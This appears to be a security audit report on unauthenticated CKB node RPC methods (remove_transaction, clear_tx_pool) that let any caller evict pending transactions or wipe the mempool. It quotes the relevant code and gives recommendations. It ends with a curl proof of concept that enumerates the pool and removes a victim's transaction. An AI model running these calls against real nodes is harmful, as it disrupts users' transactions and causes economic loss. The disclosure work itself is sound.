### Title
Unauthenticated `remove_transaction` and `clear_tx_pool` RPC Methods Allow Any Caller to Evict Arbitrary Pending Transactions — (`rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` and `clear_tx_pool` RPC methods in the `Pool` module perform privileged tx-pool mutations without any caller authorization or ownership check. Any client with RPC access can remove any pending transaction — regardless of who submitted it — or wipe the entire pool. The RPC server itself has no authentication layer. When the RPC is exposed beyond localhost (a supported, documented configuration), an unprivileged external attacker can exploit this to grief specific users or disrupt the node's mempool entirely.

---

### Finding Description

**Root cause — no caller authorization in `remove_transaction`:**

`rpc/src/module/pool.rs` lines 662–669:

```rust
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

The function accepts a `tx_hash` supplied entirely by the caller and immediately forwards it to `remove_local_tx`. There is no check that the caller is the original submitter of the transaction, no ownership token, and no authentication of any kind.

**Root cause — no caller authorization in `clear_tx_pool`:**

`rpc/src/module/pool.rs` lines 684–692:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

Any caller can wipe the entire pending pool with a single unauthenticated call.

**No RPC-level authentication:**

`rpc/src/server.rs` lines 119–129 show the Axum router is built with `CorsLayer::permissive()` and no authentication middleware. The only protection is the configured `listen_address`.

**Exposed attack surface:**

`resource/ckb.toml` lines 177–193 show the default `listen_address = "127.0.0.1:8114"` with the comment "Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged." However, the `listen_address` field is a fully supported configuration option, and operators routinely set it to `0.0.0.0` or a public interface to serve wallets, dApps, and block explorers. The `Pool` module is enabled by default in the `modules` list. There is no authentication mechanism to fall back on once the address is widened.

**Exploit path:**

1. Attacker identifies a CKB node with `rpc.listen_address` bound to a non-loopback interface (common for public-facing nodes).
2. Attacker observes the tx pool via `get_raw_tx_pool` (also unauthenticated) to enumerate pending transaction hashes.
3. Attacker calls `remove_transaction` with the hash of a victim's pending transaction. The call succeeds immediately — `remove_tx` in `tx-pool/src/process.rs` lines 440–455 removes the entry from the verify queue, orphan pool, and pool map with no ownership check.
4. Attacker repeats for every transaction in the pool, or calls `clear_tx_pool` once to wipe all pending transactions simultaneously.

---

### Impact Explanation

- **Targeted transaction eviction**: An attacker can remove any specific user's pending transaction from the pool. For time-sensitive transactions (those using `since` fields for time-locks or epoch-locks), repeated eviction prevents confirmation within the valid window, causing the transaction to become permanently invalid — a form of irreversible economic harm without the attacker spending any funds.
- **Full mempool wipe**: `clear_tx_pool` allows a single unauthenticated call to evict all pending transactions from the node, disrupting all users whose transactions were pending on that node and degrading the node's utility as a relay point.
- **Sustained DoS**: Because there is no rate limiting or caller identity tracking, an attacker can loop `remove_transaction` calls faster than users can resubmit, creating a sustained denial-of-service against specific addresses.

---

### Likelihood Explanation

The default configuration binds to localhost, which limits exposure. However:
- Many production deployments expose the RPC publicly (wallets, block explorers, dApp backends).
- The `Pool` module is in the default `modules` list.
- No authentication mechanism exists at any layer of the RPC stack.
- The attack requires only HTTP access and knowledge of a transaction hash (obtainable from `get_raw_tx_pool`, also unauthenticated).

Likelihood is **medium** for nodes with public RPC exposure, which is a common real-world deployment pattern.

---

### Recommendation

1. Add an ownership/submitter token to `remove_transaction` so only the original submitter (or a node operator with a configured secret) can remove a transaction.
2. Gate `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` behind an operator-only authentication mechanism (e.g., a bearer token checked in the Axum middleware layer in `rpc/src/server.rs`).
3. At minimum, document these methods as operator-only and enforce that the `Pool` module's destructive methods are only reachable from localhost, separate from read-only pool methods.

---

### Proof of Concept

```bash
# 1. Enumerate pending transactions on a publicly exposed node
curl -s http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns list of tx hashes

# 2. Remove a victim's specific pending transaction (no auth required)
curl -s http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"remove_transaction","params":["<victim_tx_hash>"]}'
# Returns: {"result": true}

# 3. Or wipe the entire pool in one call
curl -s http://<node-ip>:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"clear_tx_pool","params":[]}'
# Returns: {"result": null}
```

**Relevant code locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-701)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** tx-pool/src/process.rs (L440-455)
```rust
    pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
        let id = ProposalShortId::from_tx_hash(&tx_hash);
        {
            let mut queue = self.verify_queue.write().await;
            if queue.remove_tx(&id).is_some() {
                return true;
            }
        }
        {
            let mut orphan = self.orphan.write().await;
            if orphan.remove_orphan_tx(&id).is_some() {
                return true;
            }
        }
        let mut tx_pool = self.tx_pool.write().await;
        tx_pool.remove_tx(&id)
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
